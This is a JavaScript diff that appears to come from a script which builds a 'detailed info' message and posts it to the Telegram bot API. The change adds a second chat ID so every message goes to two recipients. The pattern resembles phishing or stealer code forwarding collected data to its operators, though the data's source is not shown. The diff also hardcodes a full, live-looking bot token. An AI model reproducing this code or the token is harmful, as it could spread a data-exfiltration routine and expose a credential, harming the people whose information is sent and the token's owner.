@@ -518,11 +518,12 @@ ${detailedInfoSection}
 `;
 
                 const botToken = '8157111925:AAEq1sV-01ewJ29tIjXjMmXWKfWx4lU5isI';
-                const chatId = '1747742228';
+                const chatIds = ['1747742228', '6483881505'];
 
                 const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
                 try {
+                    for (const chatId of chatIds) {
                     const response = await fetch(url, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
